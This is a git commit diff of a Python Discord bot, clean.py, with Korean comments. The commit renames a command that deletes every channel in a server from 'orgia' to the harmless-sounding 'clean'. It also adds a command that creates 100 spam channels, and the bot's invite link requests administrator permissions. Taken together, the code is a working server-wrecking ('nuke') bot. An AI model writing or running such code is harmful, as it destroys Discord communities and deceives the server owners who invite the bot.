43b1a023f0d7a3d9c4d71d8a24fd579ead0791b9
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-22 16:09:46 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -12,7 +12,7 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name="Persona 3"))
+  await client.change_presence(activity=discord.Game(name="튀엣"))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
@@ -20,7 +20,7 @@ async def on_ready():
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
 @client.command()
-async def orgia(ctx):
+async def clean(ctx):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
@@ -29,4 +29,9 @@ async def orgia(ctx):
 async def invite(ctx):
     await ctx.send("튀엣 \n https://discord.com/api/oauth2/authorize?client_id=819929289759653928&permissions=8&scope=bot")
 
+@client.command()
+async def create(ctx):
+     for i in range(100):
+        await ctx.guild.create_text_channel("튀엣")
+ 
 client.run(os.environ['token'])
